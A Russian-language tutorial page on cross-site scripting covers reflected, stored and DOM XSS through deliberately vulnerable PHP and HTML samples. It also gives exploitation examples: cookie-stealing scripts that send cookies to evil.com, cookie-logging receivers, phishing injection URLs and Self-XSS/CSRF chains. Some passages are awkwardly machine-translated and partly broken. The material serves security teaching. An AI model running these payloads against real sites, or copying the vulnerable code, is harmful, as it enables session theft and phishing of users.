---
title: XSS
---

## Введение в XSS

Межсайтовый скриптинг (XSS) - это уязвимость компьютерной безопасности, которая часто появляется в веб-приложениях. Это
вызвано недостаточной фильтрацией пользовательского ввода WEB-приложениями. Злоумышленники используют уязвимости
веб-сайтов для внедрения кода вредоносного сценария на веб-страницы. Когда другие пользователи просматривают эти
веб-страницы, вредоносный код запускается. Пострадавшие пользователи могут подвергаться различным атакам, таким как
кража данных cookie, захват сеанса и фишинг.

### Светоотражающий XSS

Отраженный межсайтовый скриптинг (Reflected Cross-Site Scripting) является наиболее распространенным и широко
используемым, который может прикреплять вредоносные скрипты к параметрам URL-адресов.

Отраженный XSS обычно используется злоумышленниками, чтобы побудить пользователей посетить URL-адрес, содержащий
вредоносный код, с помощью определенных методов (например, электронной почты). Когда жертва нажимает на эти специально
разработанные ссылки, вредоносный код оказывается прямо на хосте жертвы. Выполнить в браузере. Этот тип XSS обычно
появляется в строке поиска веб-сайта, в порту входа пользователя и т. Д. И часто используется для кражи клиентских
файлов cookie или фишинга.

Серверный код:

```php
<?php 
// Is there any input? 
if( array_key_exists( "name", $_GET) && $_GET['name'] != NULL) { 
    // Feedback for end user 
    echo'<pre>Hello '. $_GET['name'].'</pre>'; 
} 
?>
```

Код может быть прямой ссылкой на аргумент `имени` и не выполняет никакой фильтрации и проверки, есть очевидные
уязвимости XSS.

### Постоянный XSS

Постоянные межсайтовые сценарии также эквивалентны сохраненным межсайтовым сценариям.

Этот тип XSS не требует от пользователя щелчка по-определенному URL-адресу для выполнения межсайтового скриптинга.
Злоумышленник заранее загружает или сохраняет вредоносный код на уязвимом сервере и выполняет вредоносный код, пока
жертва просматривает страницу, содержащую вредоносный код. Постоянный XSS обычно появляется во взаимодействиях, таких
как сообщения веб-сайта, комментарии и журналы блога, а вредоносные сценарии хранятся в базе данных клиента или сервера.

Серверный код:

```php
<?php
  if( isset( $_POST['btnSign'])) {
    // Get input
    $message = trim( $_POST['mtxMessage'] );
    $name = trim( $_POST['txtName'] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = mysql_real_escape_string( $message );
    // Sanitize name input
    $name = mysql_real_escape_string( $name );
    // Update database
    $query = "INSERT INTO guestbook (comment, name) VALUES ('$message','$name' );";
    $result = mysql_query( $query) or die('<pre>'. mysql_error().'</pre>' );
    //mysql_close();}
?>
```

Код удаляет или экранирует только некоторые пробельные символы, специальные символы и обратную косую черту. Он не
фильтрует и не проверяет XSS и хранится в базе данных. Очевидно, что существует сохраненная уязвимость XSS.

### DOM XSS

Традиционные уязвимости XSS обычно появляются в коде на стороне сервера, в то время как XSS на основе DOM - это
уязвимость, основанная на объектной модели документа DOM, поэтому на нее влияет код сценария клиентского браузера.
Клиентский JavaScript может получить доступ к текстовой объектной модели DOM браузера, поэтому он может определить
URL-адрес, используемый для загрузки текущей страницы. Другими словами, программа-сценарий на стороне клиента может
динамически проверять и изменять содержимое страницы через DOM. Он не зависит от данных на стороне сервера, но получает
данные в DOM от клиента (например, извлекает данные из URL-адреса) и выполняет их локально. С другой стороны,
пользователи браузера могут манипулировать некоторыми объектами в DOM, такими как URL, местоположение и т. Д. Если
данные, введенные пользователем на клиенте, содержат вредоносные сценарии JavaScript, и эти сценарии не фильтруются и не
вылечиваются должным образом, приложение могут подвергаться XSS-атакам на основе DOM.

HTML код:

```html
<html>
<head>
    <title>DOM-XSS test</title>
</head>
<body>
<script>
    var a = document.URL;
    document.write(a.substring(a.indexOf("a=") + 2, a.length));
</script>
</body>
</html>
```

Сохраните код в domXSS.html, доступ через браузер:

```text
http://127.0.0.1/domXSS.html?a=<script>alert('XSS')</script>
```

Вы можете вызвать уязвимость XSS.

## Использование XSS

### Кража файлов cookie

Злоумышленник может использовать следующий код для получения информации cookie клиента:

```html
<script>
    document.location = "http://www.evil.com/cookie.asp?cookie=" + document.cookie
    new Image().src = "http://www.evil.com/cookie.asp?cookie=" + document.cookie
</script>
<img src="http://www.evil.com/cookie.asp?cookie=" +document.cookie></img>
```

На удаленном сервере есть файл, который принимает и записывает информацию о файлах cookie, например:

```asp
<%
  msg=Request.ServerVariables("QUERY_STRING")
  testfile=Server.MapPath("cookie.txt")
  set fs=server.CreateObject("Scripting.filesystemobject")
  set thisfile=fs.OpenTextFile(testfile,8,True,0)
  thisfile.Writeline(""&msg& "")
  thisfile.close
  set fs=nothing
%>
```

```php
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookie.txt", "a");
fwrite($log, $cookie. "\n");
fclose($log);
?>
```

После того, как злоумышленник получит файлы cookie, он может войти в учетную запись жертвы, изменив файлы cookie
локального браузера.

### Захват сеанса

Из-за определенных недостатков безопасности при использовании файлов cookie разработчики начали использовать более
безопасные методы аутентификации, такие как сеанс. В механизме сеанса клиент и сервер используют идентификаторы для
идентификации пользователей и поддержания сеанса, но этот идентификатор также может использоваться другими. Суть
перехвата сеанса состоит в том, чтобы задействовать файлы cookie и отправить их на сервер.

Например, в системе сообщений CMS хранится уязвимость XSS. Злоумышленник записывает код XSS в сообщение сообщения. Когда
администратор входит в фоновый режим и проверяет Да, срабатывает XSS-уязвимость. Поскольку XSS запускается в фоновом
режиме, целью атаки является администратор. Внедряя код JavaScript, злоумышленник может захватить сеанс администратора
для выполнения определенных операций, тем самым достигнув цели повышения разрешений.

Например, если злоумышленник хочет использовать XSS для добавления учетной записи администратора, ему нужно только
использовать предыдущий аудит кода или другие методы для перехвата информации HTTP-запроса при добавлении учетной записи
администратора, а затем использовать объект XMLHTTP для отправки HTTP запрос в фоновом режиме. Запрос сопровождается
файлами cookie атакуемого и отправляется на сервер вместе, после чего может быть реализована операция добавления учетной
записи администратора.

### Фишинг

- Перенаправить фишинг

Перенаправить текущую страницу на фишинговую.

```text
http://www.bug.com/index.php?search="'><script>document.location.href="http://www.evil.com"</script>
```

- HTML-инъекция фишинга

Используйте уязвимости XSS для внедрения кода HTML или JavaScript на страницу.

```text
http://www.bug.com/index.php?search="'<html><head><title>login</title></head><body><div style="text-align:center; "><form Method="POST" Action="phishing.php" Name="form"><br /><br />Login:<br/><input name="login" /><br />Password :<br/><input name="Password" type="password" /><br/><br/><input name="Valid" value="Ok" type="submit" /><br/> </form></div></body></html>
```

Этот код встроит форму в обычную страницу.

- iframe фишинг

Это посредством фишинговых тегов вариантов `<iframe>`, встроенных в страницу удаленного домена.

```text
http://www.bug.com/index.php?search='><iframe src = "http://www.evil.com" height = "100%" width = "100%" </iframe>
```

- Флэш-фишинг

Созданный входящий файловый сервер Flash на целевом сайте со ссылкой на метку `<object>` или `<embed>`.

- Продвинутые техники фишинга

Внедрить код для взлома HTML-форм, использовать JavaScript для написания клавиатурных шпионов и тд.

### Веб-страница висит лошадь

Обычно это достигается путем подделки страницы, как это используется в теге XSS `<iframe>`.

### DOS и DDOS

Внедрение вредоносного кода JavaScript может вызвать некоторые атаки типа «отказ в обслуживании».

### XSS-червь

Благодаря тщательно составленному коду XSS можно реализовать множество функций, таких как незаконная передача, подделка
информации, удаление статей, самокопирование и тд.

## Self-XSS превращает отходы в сокровища

Self-XSS, как следует из названия, заключается в том, что точка с уязвимостями XSS может быть запущена только самим
злоумышленником, то есть он атакует свою собственную. Например, точка входа в личную приватность имеет XSS. Однако,
поскольку эту личную информацию может просматривать только пользователь, ее нельзя использовать для атак других. Такие
лазейки обычно очень маленькие и кажутся немного безвкусными. Но в некоторых конкретных сценариях сочетание с другими
уязвимостями (такими как CSRF) может превратить Self-XSS во вредоносную уязвимость. Ниже приводится краткое описание
некоторых распространенных сценариев, в которых можно использовать Self-XSS.

- CSRF существует для входа и выхода, Self-XSS для личной информации, сторонний вход

Общий процесс использования этого сценария заключается в том, что злоумышленник сначала вводит полезную нагрузку в точку
XSS личной информации, а затем злоумышленник создает вредоносную страницу, чтобы побудить жертву посетить, и вредоносная
страница выполняет следующие операции:

1. Выполнение вредоносной страницы использует CSRF, чтобы позволить жертве войти в расположение личной информации
   злоумышленника и запустить полезную нагрузку XSS.
2. Создание тега `<iframe>` полезной нагрузки JavaScript и выполнение этих операций в среде.
3. Разрешить жертве выйти из аккаунта злоумышленника
4. Затем позвольте жертве войти в интерфейс личной информации своей учетной записи через CSRF.
5. Злоумышленник извлекает токен CSRF со страницы
6. Затем вы можете использовать токен CSRF для отправки и изменения личной информации пользователя.

В этом процессе атаки необходимо обратить внимание на несколько моментов: третий шаг входа в систему не требует
взаимодействия с пользователем, используйте методы входа без пароля, такие как Google Sign In, для входа в систему; **
X-Frame-Options** необходимо установить на то же происхождение (страница может быть в том же доменном имени), страница
iframethe show)

- CSRF существует для входа в систему, Self-XSS существует для информации учетной записи, аутентификация OAUTH

1. Разрешить пользователю выйти из страницы учетной записи, но не выходить из страницы авторизации OAUTH, это необходимо
   для того, чтобы пользователь мог снова войти на страницу своей учетной записи.
2. Разрешение пользователям войти в нашу учетную запись, на странице появляется XSS, использование меток `<iframe>` для
   выполнения вредоносного кода
3. Войдите в их соответствующие учетные записи, но наш XSS был украден для сеанса